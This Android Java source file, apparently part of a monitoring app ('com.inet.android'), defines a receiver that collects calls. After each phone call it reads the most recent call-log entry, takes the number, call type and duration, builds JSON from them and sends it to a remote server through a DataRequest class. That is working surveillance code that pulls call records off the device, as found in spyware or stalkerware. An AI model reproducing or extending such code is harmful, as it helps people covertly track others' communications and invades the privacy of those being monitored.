package com.inet.android.call;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.concurrent.TimeUnit;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.preference.PreferenceManager;
import android.provider.CallLog;
import android.telephony.TelephonyManager;

import com.inet.android.request.DataRequest;
import com.inet.android.utils.Logging;
import com.inet.android.utils.WorkTimeDefiner;

/**
 * Класс сбора звонков
 * 
 * @author johny homicide
 * 
 */
public class CallReceiver extends BroadcastReceiver {
	private Context ctx;
	private String date;
	private SharedPreferences sp;
	private static String LOG_TAG = "callReceiver";

	@Override
	public void onReceive(Context arg0, Intent intent) {
		sp = PreferenceManager.getDefaultSharedPreferences(arg0);
		String call = sp.getString("call", "0");

		if (call.equals("0")) {
			Logging.doLog(LOG_TAG, "call : 0", "call : 0");
			return;
		}
		boolean isWork = WorkTimeDefiner.isDoWork(arg0);
		if (!isWork) {
			Logging.doLog(LOG_TAG, "isWork return " + Boolean.toString(isWork),
					"isWork return " + Boolean.toString(isWork));
			Logging.doLog(LOG_TAG, "after isWork retrun 0",
					"after isWork retrun 0");

			return;
		} else {
			Logging.doLog(LOG_TAG, "isWork - " + Boolean.toString(isWork),
					"isWork - " + Boolean.toString(isWork));
		}

		date = logTime();
		ctx = arg0;

		if (intent.getAction()
				.equals("android.intent.action.NEW_OUTGOING_CALL")) {
			// получаем исходящий номер
		} else if (intent.getAction().equals(
				"android.intent.action.PHONE_STATE")) {
			String phoneState = intent
					.getStringExtra(TelephonyManager.EXTRA_STATE);
			if (phoneState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
				// телефон звонит, получаем входящий номер

			} else if (phoneState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
				// телефон находится в режиме звонка (набор номера / разговор)
			} else if (phoneState.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
				// телефон находится в ждущем режиме (событие наступает по
				// окончании разговора,
				// когда уже знаем номер и факт звонка
				try {
					// TimeUnit.SECONDS.sleep(1);
					TimeUnit.MILLISECONDS.sleep(1000);
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
				getCallDetails();
			}
		}
	}

	private void getCallDetails() {

		StringBuffer sb = new StringBuffer();
		Cursor managedCursor = ctx.getContentResolver().query(
				CallLog.Calls.CONTENT_URI, null, null, null, null);

		int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
		int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
		int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);

		sb.append("Call Details :");

		managedCursor.moveToLast();
		String phNumber = managedCursor.getString(number);
		String callType = managedCursor.getString(type);
		String callDuration = managedCursor.getString(duration);
		// if (Integer.parseInt(callDuration) < 30) {
		// callDuration = "5";
		// }
		String callTypeStr = null;
		int dircode = Integer.parseInt(callType);

		switch (dircode) {
		case CallLog.Calls.OUTGOING_TYPE:
			callTypeStr = "3";
			break;

		case CallLog.Calls.INCOMING_TYPE:
			callTypeStr = "2";
			break;

		case CallLog.Calls.MISSED_TYPE:
			callTypeStr = "4";
			break;
		}

		sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
				+ callType + " \nCall Date:--- " + date
				+ " \nCall duration in sec :--- " + callDuration);
		sb.append("\n----------------------------------");
		managedCursor.close();

		String sendJSONStr = null;
		JSONObject jsonObject = new JSONObject();
		JSONArray data = new JSONArray();
		JSONObject info = new JSONObject();
		JSONObject object = new JSONObject();
		try {
			
			info.put("tel", phNumber);
			info.put("duration", callDuration);

			object.put("time", date);
			object.put("type", callTypeStr);
			object.put("info", info);
			data.put(object);
			jsonObject.put("data", data);
			// sendJSONStr = jsonObject.toString();
			sendJSONStr = object.toString();
		} catch (JSONException e) {
			Logging.doLog(LOG_TAG, "json сломался", "json сломался");
		}

		Logging.doLog(LOG_TAG, sb.toString(), sb.toString());
		Logging.doLog(LOG_TAG, sendJSONStr);

		DataRequest dr = new DataRequest(ctx);
		dr.sendRequest(sendJSONStr);
	}

	@SuppressLint("SimpleDateFormat")
	private String logTime() {
		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		Calendar cal = Calendar.getInstance();
		cal.setTimeInMillis(System.currentTimeMillis());
		return "" + formatter.format(cal.getTime());

	}
}
